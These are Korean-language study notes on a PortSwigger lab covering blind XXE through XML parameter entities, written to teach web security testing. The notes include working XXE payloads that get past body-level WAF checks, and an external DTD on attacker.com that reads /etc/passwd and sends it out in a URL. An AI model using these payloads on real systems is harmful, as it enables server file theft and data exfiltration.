# Lab: Blind XXE with out-of-band interaction using XML parameter entities

## 개요

- **난이도**: Practitioner
- **주제**: Blind XXE — 파라미터 엔티티 / DTD 내부 참조 / 일반 엔티티 차단 우회
- **링크**: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities

## 목표

일부 서버는 XML 본문에서 일반 엔티티(`&xxe;`) 참조를 차단한다. 파라미터 엔티티(`%xxe;`)는 DTD 내부에서 참조되므로 이 차단을 우회한다. OOB 외부 요청을 유발해 Blind XXE 취약점 존재를 확인한다.

## 003 랩과의 차이

```
[003 랩 — 일반 엔티티 (General Entity)]
  선언: <!ENTITY xxe SYSTEM "http://외부/">
  참조: <productId>&xxe;</productId>   ← XML 본문에서 참조
  차단: 서버/WAF 가 XML 본문의 &xxe; 감지 가능

[004 랩 (이번) — 파라미터 엔티티 (Parameter Entity)]
  선언: <!ENTITY % xxe SYSTEM "http://외부/">
  참조: %xxe;                           ← DTD 내부에서 참조
  특징: XML 본문이 아닌 DOCTYPE 블록에서 처리
  우회: XML 본문 검사를 통과
```

## 일반 엔티티 vs 파라미터 엔티티

### 일반 엔티티 (General Entity)

```xml
<!-- 선언 -->
<!ENTITY name "value">
<!ENTITY name SYSTEM "file:///etc/passwd">

<!-- 참조 위치: XML 문서 본문 -->
<element>&name;</element>

특징:
  & 로 시작, ; 로 끝
  XML 콘텐츠(태그 사이)에서 사용
  DTD 내부 선언에서는 사용 불가
```

### 파라미터 엔티티 (Parameter Entity)

```xml
<!-- 선언 — % 기호 추가 -->
<!ENTITY % name "value">
<!ENTITY % name SYSTEM "http://attacker.com/">

<!-- 참조 위치: DTD 내부에서만 사용 -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/">
  %xxe;   ← DTD 블록 안에서 참조
]>

특징:
  % 로 시작, ; 로 끝
  DTD 선언 내부에서만 참조 가능
  XML 본문에서는 사용 불가
  외부 DTD 파일 로딩에서 핵심 역할
```

### 왜 파라미터 엔티티가 필요한가

```
일반 엔티티 차단 시나리오:

서버 또는 WAF 가 XML 본문에서 & 참조 감지:
  <productId>&xxe;</productId>
  → "외부 엔티티 참조 감지" → 차단

파라미터 엔티티는 DTD 안에서 처리:
  <!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://외부/">
    %xxe;   ← DTD 파싱 단계에서 처리, XML 본문 검사 전
  ]>
  → XML 본문 검사를 거치지 않음
  → 일반 엔티티 차단 우회 가능
```

## 공격 방법

### 페이로드

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/">
  %xxe;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

### 003 랩 페이로드와 비교

```xml
<!-- 003 랩 — 일반 엔티티 -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://외부/"> ]>
<stockCheck>
  <productId>&xxe;</productId>   ← 본문에서 참조
  <storeId>1</storeId>
</stockCheck>

<!-- 004 랩 (이번) — 파라미터 엔티티 -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://외부/">
  %xxe;                          ← DTD 안에서 참조
]>
<stockCheck>
  <productId>1</productId>       ← 본문은 정상값
  <storeId>1</storeId>
</stockCheck>
```

### 처리 순서

```
1. XML 파서가 DOCTYPE 블록 파싱 시작

2. <!ENTITY % xxe SYSTEM "http://외부/"> 파싱
   → 파라미터 엔티티 xxe 정의

3. %xxe; 참조 평가 (DTD 내부)
   → http://외부/ 로 HTTP 요청 발생
   → DNS 조회 발생
   → Burp Collaborator 가 기록

4. XML 본문 파싱 (productId = "1")
   → 본문에 엔티티 참조 없음 → 정상 처리

5. 서버 응답: 정상 또는 에러 (내용 없음)
   Collaborator: DNS + HTTP 인터랙션 기록 확인
```

## 파라미터 엔티티의 심화 활용

### 외부 DTD 로딩으로 데이터 탈취

파라미터 엔티티의 진짜 위력은 외부 DTD 파일을 로딩해 내부 파일 내용을 OOB 로 탈취하는 것:

```xml
<!-- 공격자 서버의 외부 DTD 파일: http://attacker.com/evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?x=%file;'>">
%exfil;
%send;
```

```xml
<!-- 타겟 서버로 보내는 페이로드 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

```
흐름:
  %xxe; → 외부 DTD 로드
  %file; → /etc/passwd 읽기
  %exfil; → send 엔티티 동적 정의
  %send; → http://attacker.com/?x=<파일내용> 요청
  → Collaborator 에서 파일 내용 확인
```

이번 랩(004)은 이 심화 탈취 기법의 전 단계로, 파라미터 엔티티로 OOB 요청이 가능한지 먼저 확인하는 것이다.

## 핵심 정리

- 파라미터 엔티티(`%name;`)는 DTD 내부에서 참조되므로 XML 본문의 엔티티 참조 차단을 우회한다.
- `<!ENTITY % xxe SYSTEM "http://...">` + `%xxe;` 조합으로 DTD 파싱 단계에서 외부 HTTP/DNS 요청이 발생한다.
- XML 본문(`<productId>`)은 정상값 그대로여서 본문 레벨 WAF 탐지에 걸리지 않는다.
- 이번 랩은 파라미터 엔티티로 OOB 가 가능함을 확인하는 단계이며, 외부 DTD 로딩을 통한 데이터 탈취의 선행 조건이다.

## 배운 점 및 추가 학습

### 1. 엔티티 유형 종합 정리

```
[내부 일반 엔티티]
  <!ENTITY name "value">
  참조: &name;   (XML 본문)
  용도: 반복 문자열 치환

[외부 일반 엔티티 — XXE 001~003]
  <!ENTITY name SYSTEM "URI">
  참조: &name;   (XML 본문)
  용도: 파일 읽기, SSRF, OOB (003)

[내부 파라미터 엔티티]
  <!ENTITY % name "value">
  참조: %name;  (DTD 내부)
  용도: DTD 재사용, 동적 엔티티 정의

[외부 파라미터 엔티티 — XXE 004]
  <!ENTITY % name SYSTEM "URI">
  참조: %name;  (DTD 내부)
  용도: 외부 DTD 로딩, OOB 데이터 탈취
```

### 2. 일반 엔티티와 파라미터 엔티티 사용 가능 위치

```
위치               일반 엔티티(&)   파라미터 엔티티(%)
─────────────────────────────────────────────────
XML 본문            O               X
내부 DTD 선언 값     X               O
외부 DTD            O               O
속성값              O               X
```

### 3. 003~004 랩 비교

| 항목 | 003 (일반 엔티티) | 004 (파라미터 엔티티) |
|------|-------------------|----------------------|
| 선언 | `<!ENTITY xxe ...>` | `<!ENTITY % xxe ...>` |
| 참조 위치 | XML 본문 `&xxe;` | DTD 내부 `%xxe;` |
| 차단 우회 | 어려움 | 본문 검사 우회 |
| 결과 확인 | Collaborator | Collaborator |
| 심화 활용 | 제한적 | 외부 DTD 로딩 → 데이터 탈취 |
